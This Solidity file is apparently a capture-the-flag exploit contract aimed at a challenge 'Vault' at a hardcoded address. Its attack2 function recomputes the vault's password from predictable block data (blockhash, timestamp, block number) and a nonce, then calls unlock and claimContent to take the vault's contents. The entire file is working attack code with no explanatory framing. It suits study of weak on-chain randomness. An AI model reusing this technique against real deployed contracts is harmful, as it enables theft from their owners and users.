// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./Campaign.sol";


contract Contract{
        address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0xc8d36A3b105fB53aBdaa26Df1661264fbAe2B42E);

        address public owner;
        bytes32 private passphrase;
        uint256 public nonce;
        bytes16 _password;

        Vault public creature = Vault(YOUR_CHALLENGE_CONTRACT_ADDRESS);

	constructor() {
                //owner = address(msg.sender);
		owner = address(0x439c8a7099bdc7Fd924C9F3eB1915223B4f1A57A);  //Setup
	}

        function attack2() external {
                passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));

                uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
                _password = bytes16( (uint128(uint64(uint160(owner))) << 64) | _secretKey );

                creature.unlock(_password);
                creature.claimContent();
        }

        function _generateKey(uint256 _reductor) private returns (uint256 ret) {
                ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
                nonce++;
        }

        function _magicPassword() private returns (bytes8) {
                uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
                uint128 _key2 = uint128(_generateKey(2));
                bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
                return (_secret >> 32 | _secret << 16);
        }

}

